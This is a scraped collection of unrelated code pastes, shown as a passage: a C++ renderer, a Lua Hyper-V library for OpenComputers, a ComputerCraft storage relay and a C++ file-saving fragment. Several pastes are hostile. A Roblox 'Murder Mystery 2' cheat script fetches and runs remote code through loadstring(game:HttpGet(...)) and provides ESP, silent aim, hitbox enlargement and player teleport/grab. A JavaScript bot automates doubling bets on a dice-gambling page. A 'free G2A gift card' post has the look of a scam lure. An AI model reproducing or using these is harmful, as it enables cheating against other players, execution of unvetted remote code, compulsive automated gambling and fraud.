	chan.Add<Engine::Window::Resize>(*this);
	//chan.Add<Engine::Task::TaskCompleted>(*this);
}


/// <summary>
/// Default virtual destructor
/// </summary>
Renderer::~Renderer()
{
	if (mUseHardwareRaytracing)
	{
		delete mRaytraceHWNode;
	}
	else
	{
		delete mAccelerationNode;
		delete mRaygenNode;
		delete mRaytraceNode;
	}
	delete mRenderNodesNode;
	delete mMaterialNode;
	delete mShadowRenderNode;
	delete mCullingNode;
	delete mDrawNode;
	delete mReductionNode;
	delete mResolveNode;
	delete mRenderNode;

	delete mPipeline;
}

/// <summary>
/// Initialize system
/// </summary>
/// <returns>True on success, false otherwise</returns>
bool Renderer::Init()
{
	mImgui = new Engine::RenderPassImgui(mOptions, mRenderer, mAppState->mWindowSize.x, mAppState->mWindowSize.y);
	ImGui::GetStyle().WindowBorderSize = 0;
	ImGui::GetIO().ConfigFlags |= ImGuiConfigFlags_DockingEnable;

	mGBufferPass = new Engine::GBuffer(mRenderer, mAppState->mWindowSize.x, mAppState->mWindowSize.y, mOptions->Get<int>(""Renderer.Antialiasing.SamplesMSAA""));
	mWireframePass = new Engine::RenderPassWireframe(mRenderer, mAppState->mWindowSize.x, mAppState->mWindowSize.y, mOptions->Get<int>(""Renderer.Antialiasing.SamplesMSAA""));
	mTexturedPass = new Engine::RenderPassTextured(mRenderer, mAppState->mWindowSize.x, mAppState->mWindowSize.y, mOptions->Get<int>(""Renderer.Antialiasing.SamplesMSAA""));
	//mNativeResolvePass = new Engine::RenderPassResolveNative(mRenderer, mAppState->mWindowSize.x, mAppState->mWindowSize.y, mOptions->Get<int>(""Renderer.Antialiasing.SamplesMSAA""));
	mMultisampling = new Engine::Multisample(mRenderer, mAppState->mWindowSize.x, mAppState->mWindowSize.y, mOptions->Get<int>(""Renderer.Antialiasing.SamplesMSAA""));
	mResolve = new Engine::RenderPassResolveMultisample(mRenderer, mAppState->mWindowSize.x, mAppState->mWindowSize.y, mOptions->Get<int>(""Renderer.Antialiasing.SamplesMSAA""));
	mCulling = new Engine::Culling(mRenderer, mOptions->Get<int>(""Renderer.Culling.MaxBuffers""), mOptions->Get<int>(""Scene.MaxObjects""));
	mLightingSystem = new Engine::LightingSystem(mRenderer, mOptions->Get<int>(""Renderer.Lighting.MaxLights""), mOptions->Get<int>(""Renderer.Lighting.VirtualShadowMapResolution""), mCulling);
	mLightingPass = new Engine::LightingPass(mRenderer, mAppState->mWindowSize.x, mAppState->mWindowSize.y, mOptions->Get<int>(""Renderer.Antialiasing.SamplesMSAA""), mLightingSystem);
	if (mUseHardwareRaytracing)
	{
		mRaytracerPassHW = new Engine::RenderPassRaytracerHW(mRenderer, mAppState->mWindowSize.x, mAppState->mWindowSize.y);
	}
	else
	{
		mRaytracerPass = new Engine::RenderPassRaytracer(mRenderer, mAppState->mWindowSize.x, mAppState->mWindowSize.y, mAppState->mRaytracer);
	}
	mHiZPass = new Engine::RenderPassHiZ(mRenderer, mAppState->mWindowSize.x, mAppState->mWindowSize.y);
	mAvgLuminance = new Engine::RenderPassAvgLuminance(mRenderer, mAppState->mWindowSize.x, mAppState->mWindowSize.y, mOptions->Get<int>(""Renderer.Antialiasing.SamplesMSAA""));

	mGizmoPass = new Engine::RenderGizmo(mRenderer, 1024);

	//mAppState->mRenderNodes = new Engine::RenderNodeList(mRenderer, mOptions->Get<int>(""Scene.MaxObjects""), std::vector<Engine::RootSignature*> { mTexturedPass->GetRootSignature(), mLightingSystem->GetRootSignature(), mHiZPass->GetRootSignature() });
	mAppState->mRenderNodes = new Engine::RenderNodeList(mRenderer, mOptions->Get<int>(""Scene.MaxObjects""), std::vector<Engine::RootSignature*> { mTexturedPass->GetRootSignature() });

	mAppState->mEditorSettingsDialog = new Engine::EditorSettingsDialog(mLog, mOptions, mImgui, ""../Data/Config/ConfigModel.conf"");

	return true;
}

/// <summary>
/// Shutdown system
/// </summary>
void Renderer::Shutdown()
{
	mRenderer->Flush(); 

	delete mAppState->mEditorSettingsDialog;

	delete mImgui;
	delete mHiZPass;
	delete mGBufferPass;
	delete mWireframePass;
	delete mTexturedPass;
	//delete mNativeResolvePass;
	delete mMultisampling;
	delete mResolve;
	delete mLightingSystem;
	delete mCulling;
	delete mLightingPass;
	delete mRaytracerPass;
	delete mRaytracerPassHW;
	delete mAvgLuminance;
	delete mGizmoPass;
}

/// <summary>
/// Update call on system
/// </summary>
void Renderer::Update()
{
	mPipeline->Update();
}

/// <summary>
/// Window resize
/// </summary>
/// <param name=""r"">Window resize event parameter structure</param>
void Renderer::Handle(const Engine::Window::Resize& r)
{
	// Resize render pass objects bound to window size
	mImgui->Resize(r.mWidth, r.mHeight);
}"
0rup5Cwf,Lua Hyper-V (applied to OpenComputers),ASMProgrammer,Lua,Friday 5th of July 2024 03:48:03 PM CDT,"local hyper_v = {}
-- –û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å–∞ –¥–ª—è –¥–∏—Å–∫–∞, –∫–æ—Ç–æ—Ä—ã–π –º–æ–∂–Ω–æ –ø–æ–¥–∫–ª—é—á–∏—Ç—å –∫ SCSI-–∫–æ–Ω—Ç—Ä–æ–ª–ª–µ—Ä—É
hyper_v.IScsiDrive = {}

-- Defines the current state of a virtual machine.
hyper_v.VirtualMachineState = {
    -- <summary>The state of the virtual machine could not be determined.</summary>
    Unknown = 0,
    -- <summary>The virtual machine is in an other state.</summary>
    Other = 1,
    -- <summary>The virtual machine is running.</summary>
    Running = 2,
    -- <summary>The virtual machine is turned off.</summary>
    Off = 3,
    -- <summary>The virtual machine is in the process of turning off.</summary>
    ShuttingDown = 4,
    -- <summary>The virtual machine does not support being started or turned off.</summary>
    NotApplicable = 5,
    -- <summary>The virtual machine might be completing commands, and it will drop any new requests.</summary>
    EnabledButOffline = 6,
    -- <summary>The virtual machine is in a test state.</summary>
    InTest = 7,
    -- <summary>The virtual machine might be completing commands, but it will queue any new requests.</summary>
    Deferred = 8,
    -- <summary>The virtual machine is running but in a restricted mode. The behavior of the virtual machine is similar to the Running state, but it processes only a restricted set of commands. All other requests are queued.</summary>
    Quiesce = 9,
    -- <summary>The virtual machine is in the process of starting. New requests are queued.</summary>
    Starting = 10
}

hyper_v.VirtualHardDrive = {}
hyper_v.VirtualHardDrive.__index = hyper_v.VirtualHardDrive

-- The file format of the virtual hard disk.
hyper_v.VirtualHardDiskFormat = {
    -- <summary>Generation 1 virtual hard disk format.</summary>
    Vhd = 2,
    -- <summary>Generation 2 virtual hard disk format.</summary>
    Vhdx = 3
}

-- Defines the type of virtual hard disk.
hyper_v.VirtualHardType = {
    -- <summary>Space for fixed virtual hard disks is first allocated when the file is created.</summary>
    FixedSize = 2,
    -- <summary>Space for dynamically expanding virtual hard disks is allocated on demand.</summary>
    DynamicallyExpanding = 3
    -- Differencing disks are not supported by this library.
    -- Differencing = 4
}

hyper_v.VirtualHardDisk = {}
hyper_v.VirtualHardDisk.__index = hyper_v.VirtualHardDisk

-- Define the ScsiController class
hyper_v.ScsiController = {}
hyper_v.ScsiController.__index = hyper_v.ScsiController
hyper_v.ScsiController.Drives = {}

-- Defines virtual DVD media
hyper_v.VirtualDvdDisk = {}
hyper_v.VirtualDvdDisk.__index = hyper_v.VirtualDvdDisk

-- Defines a virtual DVD drive
hyper_v.VirtualDvdDrive = {}
hyper_v.VirtualDvdDrive.__index = hyper_v.VirtualDvdDrive

hyper_v.WmiHelpers = {}

hyper_v.SecureBootTemplate = {}
hyper_v.SecureBootTemplate.RsOpenServer = ""{1734C6E8-3154-4DDA-BA5F-A874CC483422}""
hyper_v.SecureBootTemplate.RsUEFICertificateAuthority = ""{272E7447-90A4-4563-A4B9-8E4AB00526CE}""
hyper_v.SecureBootTemplate.OpenSourceShieldedVM = ""{4292AE2B-EE2C-42B5-A969-DD8F8689F6F3}""

-- Define the MacAddress class
hyper_v.MacAddress = {}
hyper_v.MacAddress.__index = hyper_v.MacAddress

-- Define the NetworkAdapter class
hyper_v.NetworkAdapter = {}
hyper_v.NetworkAdapter.__index = hyper_v.NetworkAdapter

-- Defines the automatic start action.
hyper_v.AutomaticStartAction = {
    -- Do not start automatically.
    Nothing = 2,
    -- Automatically start if the virtual machine was running when the service stopped.
    StartIfRunning = 3,
    -- Always start the virtual machine automatically.
    AlwaysStart = 4
}

-- Defines the automatic stop action.
hyper_v.AutomaticStopAction = {
    -- Save the virtual machine state.
    Save = 3,
    -- Turn off the virtual machine.
    TurnOff = 2,
    -- Shutdown the guest operating system.
    Shutdown = 4
} 

-- Defines the port mirroring mode for a network adapter.
hyper_v.PortMirroringMode = {
    -- The network adapter will not participate in mirroring.
    None = nil,

    -- The network adapter will accept mirrored data from source ports.
    Destination = nil,

    -- The network adapter will send mirrored data to detination ports.
    Source = nil
}

-- Defines the priority when balancing memory availability compared to other virtual machines.
hyper_v.MemoryWeight = {
    -- The lowest priority possible.
    Lowest = 0,

    -- The priority is lower than low.
    Lower = 1250,

    -- The priority is lower than balanced.
    Low = 2500,

    -- The priority is lower than balanced.
    BalancedLow = 3750,

    -- The priority is balanced.
    Balanced = 5000,

    -- The priority is higher than balanced.
    BalancedHigh = 6250,

    -- The priority is high.
    High = 7500,

    -- The priority is higher than high.
    Higher = 8750,

    -- The highest priority possible.
    Higest = 10000
}

function hyper_v.IScsiDrive.new()
  local obj = {}
  setmetatable(obj, hyper_v.IScsiDrive)
  hyper_v.IScsiDrive.__index = hyper_v.IScsiDrive
  return obj
end

-- Constructor function for MacAddress class
function hyper_v.MacAddress.new(mac)
    local self = setmetatable({}, hyper_v.MacAddress)
    self.mac = mac
    return self
end

-- Method to validate the MAC address format and check if it is a unicast MAC address
function hyper_v.MacAddress:validate()
    local pattern = ""^([0-9A-Fa-f][0-9A-Fa-f](-|%|:)){5}[0-9A-Fa-f][0-9A-Fa-f]$""
    if string.match(self.mac, pattern) then
        return true
    else
        return false
    end
end

-- Method to convert the MacAddress object to its string representation
function hyper_v.MacAddress:toString(lowercase)
    if lowercase then
        return string.lower(self.mac)
    else
        return self.mac
    end
end

-- Method to convert the MacAddress object to its string representation using a separator
function hyper_v.MacAddress:toStringWithSeparator(separator, lowercase)
    local formattedMac = string.gsub(self.mac, ""[-%:]"", separator)
    if lowercase then
        return string.lower(formattedMac)
    else
        return formattedMac
    end
end

-- Constructor function for NetworkAdapter class
function hyper_v.NetworkAdapter.new(virtualSwitch)
    local self = setmetatable({}, hyper_v.NetworkAdapter)
    self.IpsecOffloading = true
    self.IpsecSecurityAssociations = 512
    self.PortMirroringMode = ""None""
    self.ProtectedNetwork = true
    self.Vmq = true
    self.VirtualSwitch = virtualSwitch
    return self
end

-- Method to set VLAN ID for NetworkAdapter
function hyper_v.NetworkAdapter:setVlanId(value)
    if value < 1 or value > 4094 then
        error(""VlanId must be between 1 and 4094."")
    end
    self.Vlan = true
    self.vlanId = value
end

-- Method to set Maximum Bandwidth for NetworkAdapter
function hyper_v.NetworkAdapter:setMaximumBandwidth(value)
    if value > 999999999 then
        error(""MaximumBandwidth must be between 0 and 999999999."")
    end
    self.maximumBandwidth = value
end

-- Method to set Minimum Bandwidth for NetworkAdapter
function hyper_v.NetworkAdapter:setMinimumBandwidth(value)
    if value > 999999999 then
        error(""MinimumBandwidth must be between 0 and 999999999."")
    end
    self.minimumBandwidth = value
end

function hyper_v.ScsiController.new()
    local self = setmetatable({}, hyper_v.ScsiController)
    self.Drives = {}
    return self
end

function hyper_v.ScsiController:init()
    for i = 1, 64 do
        table.insert(self.Drives, i)
    end
end

function hyper_v.WmiHelpers.Dispose(array)
    for _, managementObject in ipairs(array) do
        managementObject:Dispose()
    end
end

function hyper_v.WmiHelpers.First(collection)
    for _, managementObject in ipairs(collection) do
        return managementObject
    end
    return nil
end

function hyper_v.WmiHelpers.ToObjectArray(managementStrings)
    local managementObjects = {}
    for index = 1, #managementStrings do
        managementObjects[index] = managementStrings[index]
    end
    return managementObjects
end

function hyper_v.VirtualDvdDrive:new()
    local self = setmetatable({}, hyper_v.VirtualDvdDrive)
    self.VirtualDvdDisk = nil
    return self
end

function hyper_v.VirtualDvdDrive:newWithDisk(virtualDvdDisk)
    local self = setmetatable({}, hyper_v.VirtualDvdDrive)
    self.VirtualDvdDisk = virtualDvdDisk
    return self
end

function hyper_v.VirtualDvdDisk:new(path)
    local self = setmetatable({}, hyper_v.VirtualDvdDisk)
    self.Path = path
    return self
end

function hyper_v.VirtualHardDisk:new()
    local vhd = {}
    setmetatable(vhd, hyper_v.VirtualHardDisk)
    vhd.Format = nil
    vhd.Path = nil
    vhd.size = 0
    return vhd
end

function hyper_v.VirtualHardDisk:SetSize(value)
    if self.Format == ""Vhd"" then
        if value < 1 or value > 2040 then
            error(""Size must be between 1 and 2040."")
        end
    elseif self.Format == ""Vhdx"" then
        if value < 1 or value > 65536 then
            error(""Size must be between 1 and 65536."")
        end
    end
    self.size = value
end

function hyper_v.VirtualHardDrive:new()
    local vhd = {}
    setmetatable(vhd, hyper_v.VirtualHardDrive)
    vhd.MaximumIOPS = 0
    vhd.MinimumIOPS = 0
    vhd.VirtualHardDisk = nil
    return vhd
end

function hyper_v.VirtualHardDrive:SetMaximumIOPS(value)
    if value < 0 or value > 1000000000 then
        error(""MaximumIOPS must be between 0 and 1000000000."")
    end
    self.MaximumIOPS = value
end

function hyper_v.VirtualHardDrive:SetMinimumIOPS(value)
    if value < 0 or value > 1000000000 then
        error(""MinimumIOPS must be between 0 and 1000000000."")
    end
    self.MinimumIOPS = value
end

function hyper_v.VirtualHardDrive:AttachVirtualHardDisk(virtualHardDisk)
    self.VirtualHardDisk = virtualHardDisk
end

function hyper_v.VirtualHardDrive:__call(virtualHardDisk, minimumIOPS, maximumIOPS)
    local vhd = {}
    setmetatable(vhd, hyper_v.VirtualHardDrive)
    vhd.VirtualHardDisk = virtualHardDisk
    vhd.MinimumIOPS = minimumIOPS
    vhd.MaximumIOPS = maximumIOPS
    return vhd
end

return hyper_v"
Y97Ain62,ReactorStorage,QuickMash,Lua,Friday 5th of July 2024 02:59:52 PM CDT,"local wired = peripheral.wrap(""back"")
local wireless = peripheral.wrap(""right"")
local mfsu_one = peripheral.wrap(""mfsu_4"")
local mfsu_two = peripheral.wrap(""mfsu_5"")

local euStoredTotal, capacityTotal
local relayID = 516

function OpenWireless()
	rednet.open(""right"")
	rednet.close(""back"")
end

function OpenWired()
	rednet.open(""back"")
	rednet.close(""right"")
end

function SendToRelay(msg)
	rednet.send(relayID, msg)
end

function MainLoop()
	while true do
		sleep(1)
		OpenWired()
		euStoredTotal = mfsu_one.getEUStored() + mfsu_two.getEUStored()
		capacityTotal = mfsu_one.getEUCapacity() + mfsu_two.getEUCapacity()
		OpenWireless()
		SendToRelay(""<eustored>"" .. euStoredTotal)
		SendToRelay(""<eucapacity>"" .. capacityTotal)
	end
end

MainLoop()"
qHEPgsNt,optimus crime snowybot2.0,coinwalk,JavaScript,Friday 5th of July 2024 02:37:35 PM CDT,"var nion = parseFloat(document.getElementById('pct_balance').value);
var smartz = parseFloat(document.getElementById('pct_balance').value);
var prefit = Number((nion/144).toPrecision(2));
var winnerdinner = parseFloat(document.getElementById('pct_balance').value);
var tens = (prefit*10);
var sevens = (prefit*6.99);
var eights = (prefit*7.99);
var james = parseFloat(document.getElementById('pct_balance').value);
var belance = parseFloat(document.getElementById('pct_balance').value);
var snowy = 0;
var beast = prefit;
var greedy =  parseFloat(document.getElementById('pct_balance').value);
var bolance = parseFloat(document.getElementById('pct_balance').value);
var golum = parseFloat(document.getElementById('pct_balance').value);
var snow = parseFloat(document.getElementById('pct_balance').value);



function go(){
bolance = parseFloat(document.getElementById('pct_balance').value);
if (bolance<snow){
belance = belance-beast;
snow = parseFloat(bolance);
}
if (bolance>snow){
belance = belance+beast;
snow = parseFloat(bolance);
}
if ((belance>(((Math.floor(belance/tens))*tens)+sevens))&&(belance<(((Math.floor(belance/tens))*tens)+eights))&&(belance!=snowy)){
        beast = beast*2;
        snowy = parseFloat(belance);
}
if ((((nion)-beast)<=0)&&(belance>=(james+(nion)))&&(belance>(((Math.floor(belance/tens))*tens)+eights))){
snowy = 0;
beast = prefit;
james = parseFloat(belance);
}
if ((((nion)-beast)<=0)&&(belance>=(james+(nion)))&&(belance<(((Math.floor(belance/tens))*tens)+sevens))){
snowy = 0;
beast = prefit;
james = parseFloat(belance);
}
if ((((nion)-beast)<=0)&&(belance>=(james+(nion)))&&(belance>(((Math.floor(belance/tens))*tens)+sevens))&&(belance<(((Math.floor(belance/tens))*tens)+eights))){
snowy = parseFloat(belance);
beast = prefit*2;
james = parseFloat(belance);
}
if ((((belance/2)-beast)<=0)&&(belance<=james)&&(belance>(((Math.floor(belance/tens))*tens)+eights))){
snowy = 0;
beast = prefit;
}
if ((((belance/2)-beast)<=0)&&(belance<=james)&&(belance<(((Math.floor(belance/tens))*tens)+sevens))){
snowy = 0;
beast = prefit;
}
if ((((belance/2)-beast)<=0)&&(belance<=james)&&(belance>(((Math.floor(belance/tens))*tens)+sevens))&&(belance<(((Math.floor(belance/tens))*tens)+eights))){
snowy = parseFloat(belance);
beast = prefit*2;
}
if ((((belance/4)-beast)<=0)&&(belance>james)&&(belance>(((Math.floor(belance/tens))*tens)+eights))){
snowy = 0;
beast = prefit;
james = parseFloat(belance);
}
if ((((belance/4)-beast)<=0)&&(belance>james)&&(belance<(((Math.floor(belance/tens))*tens)+sevens))){
snowy = 0;
beast = prefit;
james = parseFloat(belance);
}
if ((((belance/4)-beast)<=0)&&(belance>james)&&(belance>(((Math.floor(belance/tens))*tens)+sevens))&&(belance<(((Math.floor(belance/tens))*tens)+eights))){
snowy = parseFloat(belance);
beast = prefit*2;
james = parseFloat(belance);
}
if (belance>=1000){
console.log(""winner winner chicken dinner"");
    return;
}
var cat = ((belance-smartz).toFixed(8));
console.log(""profit"");
console.log(cat);
$('#pct_chance').val(49.5);
$('#pct_bet').val(((beast*1).toFixed(8)));
$('#a_lo').click();
setTimeout(() => go(), 10);
}
go();
"
iSvY8PKB,Murder Mystery 2024 script,flappywierdo49,Lua,Friday 5th of July 2024 02:35:24 PM CDT,"local Library = loadstring(game:HttpGet(""https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua""))()
local Window = Library.CreateLib(""MM2 script by d3cryptt!"", ""Serpent"")

local startergui = game:GetService(""StarterGui"")


local players = game:GetService(""Players"")
local localPlayer = players.LocalPlayer
local teleportDistance = 2
local radius = 20

-- Main
local Main = Window:NewTab(""Main"")
local MainSection = Main:NewSection(""if you execute this script twice and it breaks, rejoin"")
local MainSection = Main:NewSection(""you can't turn the esp off btw"")

MainSection:NewButton(""Infinite Yield"", ""admin commands"", function()
loadstring(game:HttpGet(""https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source""))()
end)
-- Variables for hitbox size and transparency
local hitboxSize = 2
local hitboxTransparency = 0.5

MainSection:NewButton(""Murderer/Sherrif/Innocent ESP"", ""shows everyone on the map"", function()
    local espEnabled = true -- Global variable to control ESP

    local function hasItem(player, itemName)
        -- Check the backpack
        for _, item in ipairs(player.Backpack:GetChildren()) do
            if item.Name == itemName then
                return true
            end
        end

        -- Check the equipped items (character)
        for _, item in ipairs(player.Character:GetChildren()) do
            if item:IsA(""Tool"") and item.Name == itemName then
                return true
            end
        end

        return false
    end

    local function createESP(player, color)
        for _, part in ipairs(player.Character:GetChildren()) do
            if part:IsA(""BasePart"") then
                local esp = Instance.new(""BoxHandleAdornment"")
                esp.Name = ""ESP""
                esp.Adornee = part
                esp.Size = part.Size
                esp.Color3 = color
                esp.Transparency = 0.8
                esp.AlwaysOnTop = true
                esp.ZIndex = 10
                esp.Parent = part
            end
        end

        -- Create a BillboardGui for the player's name
        if player.Character:FindFirstChild(""Head"") then
            local head = player.Character.Head
            local billboard = Instance.new(""BillboardGui"")
            billboard.Name = ""PlayerNameESP""
            billboard.Adornee = head
            billboard.Size = UDim2.new(0, 120, 0, 35) -- Adjust this size as needed
            billboard.StudsOffset = Vector3.new(0, 2, 0)
            billboard.AlwaysOnTop = true
            billboard.Parent = head

            local textLabel = Instance.new(""TextLabel"")
            textLabel.Size = UDim2.new(1, 0, 1, 0)
            textLabel.BackgroundTransparency = 1
            textLabel.Text = player.Name
            textLabel.TextColor3 = color
            textLabel.TextScaled = true
            textLabel.Parent = billboard
        end
    end

    local function updateESP()
        for _, player in ipairs(game.Players:GetPlayers()) do
            if player.Character then
                -- Remove old ESP
                for _, part in ipairs(player.Character:GetChildren()) do
                    if part:IsA(""BasePart"") and part:FindFirstChild(""ESP"") then
                        part.ESP:Destroy()
                    end
                    if part:IsA(""BasePart"") and part:FindFirstChild(""PlayerNameESP"") then
                        part.PlayerNameESP:Destroy()
                    end
                end

                -- Determine color
                local color
                if hasItem(player, ""Gun"") then
                    color = Color3.fromRGB(0, 0, 255) -- Blue for gun
                elseif hasItem(player, ""Knife"") then
                    color = Color3.fromRGB(255, 0, 0) -- Red for knife
                else
                    color = Color3.fromRGB(0, 255, 0) -- Green for none
                end

                -- Create new ESP
                createESP(player, color)
            end
        end
    end

    -- Initial ESP update
    updateESP()

    -- Update ESP periodically
    spawn(function()
        while true do
            if espEnabled then
                updateESP()
            else
                -- Clean up ESP when disabled
                for _, player in ipairs(game.Players:GetPlayers()) do
                    if player.Character then
                        for _, part in ipairs(player.Character:GetChildren()) do
                            if part:IsA(""BasePart"") and part:FindFirstChild(""ESP"") then
                                part.ESP:Destroy()
                            end
                            if part:IsA(""BasePart"") and part:FindFirstChild(""PlayerNameESP"") then
                                part.PlayerNameESP:Destroy()
                            end
                        end
                    end
                end
            end
            wait(0.1) -- Update every 0.1 seconds
        end
    end)
end)

-- Sliders for Hitbox Size and Transparency
MainSection:NewSlider(""Hitbox Size"", ""Adjust the hitbox size"", 40, 1, function(value)
    hitboxSize = value
    for _, player in ipairs(game.Players:GetPlayers()) do
        if player ~= game.Players.LocalPlayer and player.Character and player.Character:FindFirstChild(""HumanoidRootPart"") then
            local hrp = player.Character.HumanoidRootPart
            hrp.Size = Vector3.new(hitboxSize, hitboxSize, hitboxSize)
            hrp.Transparency = hitboxTransparency
            hrp.CanCollide = false
        end
    end
end)

MainSection:NewSlider(""Hitbox Transparency"", ""Adjust the hitbox transparency"", 10, 0, function(value)
    hitboxTransparency = value / 10
    for _, player in ipairs(game.Players:GetPlayers()) do
        if player ~= game.Players.LocalPlayer and player.Character and player.Character:FindFirstChild(""HumanoidRootPart"") then
            local hrp = player.Character.HumanoidRootPart
            hrp.Transparency = hitboxTransparency
            hrp.Size = Vector3.new(hitboxSize, hitboxSize, hitboxSize)
            hrp.CanCollide = false
        end
    end
end)

-- WalkSpeed and JumpPower sliders
MainSection:NewSlider(""WalkSpeed"", ""Adjust the WalkSpeed"", 25, 16, function(value)
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = value
end)

MainSection:NewSlider(""JumpPower"", ""Adjust the JumpPower"", 100, 50, function(value)
    game.Players.LocalPlayer.Character.Humanoid.JumpPower = value
end)

-- Sheriff/Innocent Section
local SheriffInnocent = Window:NewTab(""Sheriff/Innocent"")
local SheriffInnocentSection = SheriffInnocent:NewSection(""Sheriff/Innocent"")
local SheriffInnocentSection = SheriffInnocent:NewSection(""ONLY PRESS SILENT AIM ONCE"")
local SheriffInnocentSection = SheriffInnocent:NewSection(""make sure the murderer isnt behind a wall"")

SheriffInnocentSection:NewButton(""Teleport to the gun"", ""grab that gunn"", function()
    local player = game.Players.LocalPlayer.Character
    local part = workspace.Normal:FindFirstChild(""GunDrop"") 

    -- Save the player's original CFrame
    local originalCFrame = player.HumanoidRootPart.CFrame

    -- Teleport to the part
    if part then
        player.HumanoidRootPart.CFrame = part.CFrame
    end

    -- Wait for a short duration (e.g., 2 seconds) before teleporting back
    wait(0.3)

    -- Teleport back to the original CFrame
    player.HumanoidRootPart.CFrame = originalCFrame
end)


local function getNearestPlayer()
    local players = game.Players:GetPlayers()
    local localPlayer = game.Players.LocalPlayer
    local shortestDistance = math.huge
    local nearestPlayer = nil

    for _, player in ipairs(players) do
        if player ~= localPlayer and player.Character and player.Character:FindFirstChild(""HumanoidRootPart"") then
            local distance = (player.Character.HumanoidRootPart.Position - localPlayer.Character.HumanoidRootPart.Position).magnitude
            if distance < shortestDistance then
                shortestDistance = distance
                nearestPlayer = player
            end
        end
    end

    return nearestPlayer
end

local function silentAim()
    local player = game.Players.LocalPlayer
    local mouse = player:GetMouse()
    local UserInputService = game:GetService(""UserInputService"")
    local camera = workspace.CurrentCamera

    UserInputService.InputBegan:Connect(function(input, processed)
        if input.UserInputType == Enum.UserInputType.MouseButton1 and not processed then
            local nearestPlayer = getNearestPlayer()
            if nearestPlayer and nearestPlayer.Character and nearestPlayer.Character:FindFirstChild(""HumanoidRootPart"") then
                local head = nearestPlayer.Character:FindFirstChild(""Head"")
                if head then
                    mouse.Hit = head.CFrame
                    mouse.Target = head
                end
            end
        end
    end)
end

local silentAimEnabled = false

local function getNil(name, class)
    for _, v in next, getnilinstances() do
        if v.ClassName == class and v.Name == name then
            return v
        end
    end
end

local function invokeBeam(targetPosition)
    local args = {
        [1] = 1,
        [2] = targetPosition,
        [3] = ""AH2""
    }
    local player = game:GetService(""Players"").LocalPlayer
    local remoteFunction = player.Character:FindFirstChild(""Gun""):FindFirstChild(""KnifeLocal""):FindFirstChild(""CreateBeam""):FindFirstChild(""RemoteFunction"")
    
    if remoteFunction then
        remoteFunction:InvokeServer(unpack(args))
    end
end

local function getMurdererPosition()
    for _, player in ipairs(game.Players:GetPlayers()) do
        if player.Backpack:FindFirstChild(""Knife"") or player.Character:FindFirstChild(""Knife"") then
            local character = player.Character
            if character and character:FindFirstChild(""HumanoidRootPart"") then
                return character.HumanoidRootPart.Position
            end
        end
    end
    return nil
end

local function silentAim()
    if silentAimEnabled then
        local targetPosition = getMurdererPosition()
        if targetPosition then
            invokeBeam(targetPosition)
        end
    end
end


SheriffInnocentSection:NewButton(""Shoot Murderer (silent aim)"", ""Enables or disables silent aim"", function()
    silentAimEnabled = not silentAimEnabled
end)

-- Run the silent aim function every 0.1 seconds
game:GetService(""RunService"").RenderStepped:Connect(function()
    silentAim()
end)




-- Murderer Section
local Murderer = Window:NewTab(""Murderer"")
local MurdererSection = Murderer:NewSection(""Murderer"")


    local function hasItem(player, itemName)
    -- Check the backpack
    for _, item in ipairs(player.Backpack:GetChildren()) do
        if item.Name == itemName then
            return true
        end
    end

    -- Check the equipped items (character)
    for _, item in ipairs(player.Character:GetChildren()) do
        if item:IsA(""Tool"") and item.Name == itemName then
            return true
        end
    end

    return false
end

local function teleportToPlayerWithGun()
    for _, player in ipairs(game.Players:GetPlayers()) do
        if hasItem(player, ""Gun"") then
            local localPlayer = game.Players.LocalPlayer
            if player.Character and player.Character:FindFirstChild(""HumanoidRootPart"") then
                localPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame
            end
            break
        end
    end
end


MurdererSection:NewButton(""Teleport to Sheriff"", ""Teleports you to the player with the gun"", function()
    teleportToPlayerWithGun()
end)



-- Variables for the grab feature
local grabDistance = 20
local teleportDistance = 2
local keybind = Enum.KeyCode.E
local grabEnabled = false

-- Function to handle grabbing players
local function grabPlayers()
    while grabEnabled do
        for _, player in ipairs(game.Players:GetPlayers()) do
            if player ~= game.Players.LocalPlayer and player.Character and player.Character:FindFirstChild(""HumanoidRootPart"") then
                local distance = (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - player.Character.HumanoidRootPart.Position).Magnitude
                if distance <= grabDistance then
                    local newCFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.LookVector * teleportDistance)
                    player.Character:SetPrimaryPartCFrame(newCFrame)
                end
            end
        end
        wait(0.1)
    end
end


MurdererSection:NewKeybind(""Grab players"", ""Set the keybind for grab feature"", keybind, function()
    grabEnabled = not grabEnabled
    if grabEnabled then
        grabPlayers()
    end
end)

MurdererSection:NewSlider(""Grab Distance"", ""Adjust the distance to grab players"", 200, 1, function(value)
    grabDistance = value
end)

MurdererSection:NewSlider(""Teleport Distance"", ""Adjust the distance to teleport players in front of you"", 15, 1, function(value)
    teleportDistance = value
end)
"
fTn6mZJr,üéÅ G2A.COM FREE GIFT CARD GUIDE JULY 2024 V4üéÅ,wwxcwx,GetText,Friday 5th of July 2024 02:35:17 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

This is the most up to date version of this script. Any other one posted will not work
 
PDF guide here:
https://drive.google.com/file/d/1KMb0fLkKHIC2qdjR4vCSRH9rVSjJVMdX/view

Working as of:
05 > 10 July 2024"
7xGR9XbM,Copilot bug,Zgragselus,C++,Friday 5th of July 2024 02:27:35 PM CDT,"	// At start ensure that all data records are loaded
	for (size_t i = 0; i < mHeaderRecords.size(); i++)
	{
		if (mHeaderRecords[i].GetFilename() != nullptr && mHeaderRecords[i].GetFilename()[0] != '\0' && mHeaderRecords[i].GetOffset() != 0)
		{
			if (mDataRecords[i] == nullptr)
			{
				ReadRecord(i);
			}
		}
	}

	// Prior to saving, offsets have to be re-calculated, skipping the files that are not supposed
	// to be saved (i.e. those with empty names)
	size_t offset = mHeader.GetSize();
	size_t count = 0;

	for (size_t i = 0; i < mHeaderRecords.size(); i++)
	{
		if (mHeaderRecords[i].GetFilename() == nullptr || mHeaderRecords[i].GetFilename()[0] == '\0')
		{
			offset += 0;
		}
		else
		{
			offset += mDataRecords[i]->GetSize();
			count++;
		}
	}

	// Update record count in header
	mHeader.mRecordCount = count;

	offset += mBody.GetSize();

	for (size_t i = 0; i < mHeaderRecords.size(); i++)
	{
